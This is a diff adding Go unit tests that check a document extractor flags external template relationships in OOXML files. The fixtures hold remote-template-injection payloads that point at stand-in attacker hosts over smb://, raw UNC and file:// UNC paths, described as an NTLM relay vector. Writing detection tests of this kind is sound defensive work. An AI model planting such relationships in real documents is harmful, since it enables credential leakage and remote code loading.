@@ -3,6 +3,7 @@ package extract
 import (
 	"archive/zip"
 	"bytes"
+	"fmt"
 	"testing"
 	"time"
 )
@@ -123,6 +124,95 @@ func TestOOXMLExternalRel_LocalFileNoEmit(t *testing.T) {
 	// file:///C:/ is a local file, not a remote target — must NOT emit.
 	if bytes.Contains(joined, []byte("OOXML-EXTERNAL-REL")) {
 		t.Fatalf("local file:// wrongly emitted OOXML-EXTERNAL-REL; got %q", joined)
+	}
+}
+
+// TestOOXMLExternalRel_SMB checks that an smb:// Target emits a finding.
+func TestOOXMLExternalRel_SMB(t *testing.T) {
+	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1"
+    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+    Target="smb://attacker.example/share/t.dotm"
+    TargetMode="External"/>
+</Relationships>`
+
+	buf := makeOOXMLWithRels(t, relsXML)
+	res := Extract(buf, time.Time{})
+	joined := bytes.Join(res.Streams, []byte("\n"))
+	if !bytes.Contains(joined, []byte("OOXML-EXTERNAL-REL")) {
+		t.Fatalf("no OOXML-EXTERNAL-REL stream for smb:// target; got %q", joined)
+	}
+	if !bytes.Contains(joined, []byte("smb://attacker.example/share/t.dotm")) {
+		t.Fatalf("smb:// URL missing from emitted stream; got %q", joined)
+	}
+}
+
+// TestOOXMLExternalRel_UNCRaw checks that a raw UNC Target (\\server\share)
+// emits a finding (NTLM relay vector).
+func TestOOXMLExternalRel_UNCRaw(t *testing.T) {
+	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1"
+    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+    Target="\\attacker.example\share\t.dotm"
+    TargetMode="External"/>
+</Relationships>`
+
+	buf := makeOOXMLWithRels(t, relsXML)
+	res := Extract(buf, time.Time{})
+	joined := bytes.Join(res.Streams, []byte("\n"))
+	if !bytes.Contains(joined, []byte("OOXML-EXTERNAL-REL")) {
+		t.Fatalf("no OOXML-EXTERNAL-REL stream for raw UNC target; got %q", joined)
+	}
+}
+
+// TestOOXMLExternalRel_UNCFileURI checks that a file://\\server\share UNC URI
+// Target emits a finding (NTLM relay via file URI).
+func TestOOXMLExternalRel_UNCFileURI(t *testing.T) {
+	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1"
+    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+    Target="file://\\attacker.example\share\t.dotm"
+    TargetMode="External"/>
+</Relationships>`
+
+	buf := makeOOXMLWithRels(t, relsXML)
+	res := Extract(buf, time.Time{})
+	joined := bytes.Join(res.Streams, []byte("\n"))
+	if !bytes.Contains(joined, []byte("OOXML-EXTERNAL-REL")) {
+		t.Fatalf("no OOXML-EXTERNAL-REL stream for file://\\\\ UNC URI target; got %q", joined)
+	}
+}
+
+// TestOOXMLExternalRel_CumulativeCap checks that a single .rels file with more
+// than maxExternalRels external relationships emits at most maxExternalRels
+// OOXML-EXTERNAL-REL streams.
+func TestOOXMLExternalRel_CumulativeCap(t *testing.T) {
+	// Build a .rels with maxExternalRels+10 external http:// entries.
+	total := maxExternalRels + 10
+	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>` + "\n"
+	relsXML += `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` + "\n"
+	for i := 0; i < total; i++ {
+		relsXML += fmt.Sprintf(`  <Relationship Id="rId%d" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t%d.dotm" TargetMode="External"/>`, i, i) + "\n"
+	}
+	relsXML += `</Relationships>`
+
+	buf := makeOOXMLWithRels(t, relsXML)
+	res := Extract(buf, time.Time{})
+
+	count := 0
+	for _, s := range res.Streams {
+		if bytes.HasPrefix(s, []byte("OOXML-EXTERNAL-REL")) {
+			count++
+		}
+	}
+	if count > maxExternalRels {
+		t.Fatalf("cumulative cap exceeded: got %d OOXML-EXTERNAL-REL streams, want at most %d", count, maxExternalRels)
+	}
+	if count == 0 {
+		t.Fatal("expected at least one OOXML-EXTERNAL-REL stream, got none")
 	}
 }
 
